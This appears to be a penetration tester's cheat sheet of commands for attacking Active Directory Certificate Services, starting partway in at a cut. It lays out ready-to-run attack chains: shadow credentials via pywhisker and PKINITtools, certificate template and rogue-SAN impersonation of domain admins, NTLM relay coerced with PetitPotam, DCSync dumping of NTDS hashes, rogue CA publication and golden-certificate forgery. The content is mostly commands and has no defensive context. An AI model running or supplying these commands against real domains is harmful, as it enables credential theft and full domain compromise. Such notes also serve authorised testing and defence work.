s- Recon
	- `certipy find domain.local/user:pass@domain.local -enabled`

- Shadow credentials
	- Add Key Credentials to the **msDS-KeyCredentialLink** of a user, allowing authentication as that user through certificates
	- Must have one of the following ACLs over the user:
		- GenericAll
		- GenericWrite
		- AddKeyCredentialLink
	- Procedure:
		- Get a certificate
			- `python3 /opt/pywhisker/pywhisker.py -u ValidUser -p ValidPass -d domain.local -t target --dc-ip <DC IP> --action add`
				- https://github.com/ShutdownRepo/pywhisker
		- Get a TGT
			- `python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass $passwordFromAbove -dc-ip <DC IP> domain.local/target filename.ccache`
				- https://github.com/dirkjanm/PKINITtools
		- Set the ccache environment variable for Impacket
			- `export KRB5CCNAME=filename.ccache`
		- Get NT hash from TGT
			- `python3 /opt/PKINITtools/getnthash.py domain.local/target -key <key from above> -dc-ip <DC IP>`

- Privesc through misconfigured certificate templates
	- Request a certificate
		- `certipy req domain.local/user:password@ca.domain.local -ca <CA Name> -template <vulnerable template> -alt <domain admin acct>@domain.local' -out pwned`
	- Authenticate and extract user's NT hash
		- `certipy auth -pfx pwned.pfx -username <domain admin acct> -domain domain.local -dc-ip <DC IP>`

- Privesc through Certificate Authority which allows rogue Subject Alternative Names (SANs)
	- "EDITF_ATTRIBUTESUBJECTALTNAME2" config allows users to specify SANs when requesting certificates
	- Effectively, any user can request a certificate as any other user
	- Exploited the same way as above, but can be done on any template

- NTLM Relay to AD CS HTTP Endpoints
	- Certificate enrollment web interface at http://<ADCS_Server>/certsrv/ is vulnerable to Net-NTLM relay attack
	- This allows attackers to use NTLM relay to to login and generate a certificate using the relayed user's creds
	- When PKINIT auth is used, Kerberos provides user with the NT hash of the account for fallback to Net-NTLM auth, which means we can also use this to obtain the NT hash of the user.
	- Exploitation:
		- Initialize the relay
			- `certipy relay -ca <CA_IP> -template DomainController`
		- Coerce authentication
			- `python3 /opt/PetitPotam/PetitPotam.py -d domain.local <attacker_IP> <target_DC_IP>`
		- Auth with the certificate
			- `certipy auth -pfx dc.pfx -dc-ip <DC_IP>`
		- DCSync
			- `cme smb <target_DC>.domain.local -u <DC_machine_acct> -H <NT_hash> --ntds`

- NTAuthCertificates
	- LDAP object: `(CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=rlyeh,DC=com)`
	- Add new CA certificate to this object (allows it to be trusted for auth):
		- `certutil.exe -dspublish -f C:\rogue.crt NTAuthCA`

- Golden certificates:
	1. Get the CA cert and key: `certipy ca -backup -ca 'cthulhu-CA'`
	2. Forge certificates: `certipy forge -ca-pfx cth.pfx [cert options]`

